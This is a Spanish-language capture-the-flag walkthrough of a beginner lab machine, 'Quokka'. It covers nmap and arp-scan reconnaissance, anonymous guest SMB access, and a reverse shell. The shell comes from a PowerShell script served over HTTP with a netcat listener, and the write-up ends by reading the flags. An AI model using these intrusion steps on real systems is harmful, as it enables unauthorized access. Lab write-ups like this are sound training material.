
![](./images/Pasted%20image%2020241122161625.png)

Creador: Oscar.
Fecha de creación 28/10/2024
Nivel: principiante. 


RECONOCIMIENTO
-------------------------------

```
arp-scan -I eth0 --localnet
```


![](./images/Pasted%20image%2020241122162501.png)

Hacemos el scaneo para conocer la ip de la víctima y nos sale: 

![](./images/Pasted%20image%2020241122162557.png)

La ip víctima es: 

```
192.168.1.56
```

Ahora lo que haremos con nmap un scaneo. 

```
nmap -p- -sS -sV -sC --min-rate 5000 -n -vvv -Pn 192.168.1.56
```

`-p-` ⮞ Aplicar reconocimiento a todos los puertos .

`-sS` ⮞ para descubrir puertos de manera silenciosa y rápida .

`-sV` ⮞ Para realizar un escaneo en búsqueda de los servicios.

`-sC` ⮞ Para realizar un escaneo de los scripts básicos de reconocimiento. 

`--min-rate 5000` ⮞ para enviar paquetes más rápido.

`-n` ⮞ Para no aplicar la resolución DNS (tarda mucho en el caso de que no pongamos dicho parámetro). 

`-vvv` ⮞ Conforme descubre un puerto nos lo muestra por pantalla .

`-Pn` ⮞ Ignora el descubrimiento de hosts mediante ping. 


![](./images/Pasted%20image%2020241122163043.png)


Tenemos un servidor de IIS. 

Nos vamos al puerto 80, http. 

![](./images/Pasted%20image%2020241122164044.png)

Un portafolio y noticias Tech. 
Tenemos que observar bien y podremos encontrar lo siguiente: 

![](./images/Pasted%20image%2020241122164338.png)

Daniel y luis deben de hacer una revisión con privilegios. 

Vamos a ver el servicio de smb. 

```
netexec smb 192.168.1.56 -u 'guest' -p '' 
```

Vemos que tenemos acceso compartidos. 

![](./images/Pasted%20image%2020241122165128.png)

Vamos a listarlos. 

```
netexec smb 192.168.1.56 -u 'guest' -p '' --shares
```

![](./images/Pasted%20image%2020241122165212.png)

Sólo podemos a acceder a compartido porque tenemos permiso de lectura y escritura. 

```
smbclient -U guest%123456 //192.168.1.56/Compartido
```


![](./images/Pasted%20image%2020241122170250.png)

Ya estamos en smb.


En el directorio **\Compartido\Proyecto\Quokka\Código** está lo que vamos a descargarnos :

copia.bat y mantenimiento.bat


![](./images/Pasted%20image%2020241122170553.png)

Nos los decargamos con get: 

```
get mantenimiento.bat
```

Nos salimos de smb.


Hacemos un cat a mantenimiento.bat.
Nos sale lo siguiente: 

![](./images/Pasted%20image%2020241122170831.png)

Creamos una shell ps1. 
Buscamos en git-hub revershell ps1 y pegamos el script en nuestro archivo que hemos creado. 

![](./images/Pasted%20image%2020241122171658.png)


Cambiamos la ip, la que es nuestra. Y le ponemos el puerto que queramos. 

```
python -m http.server 80
```


```
nc -lvnp 5555
```

![](./images/Pasted%20image%2020241122172723.png)

Tenemos la revershell en kali. 

Hacemos un dir. 

Nos vamos al directorio raíz. 

![](./images/Pasted%20image%2020241122173020.png)

Nos vamos al directorio de administrator y desktop. Tenemos el flag del admisnitrador. 

Y vamos a ver la flag de omar.

![](./images/Pasted%20image%2020241122173719.png)


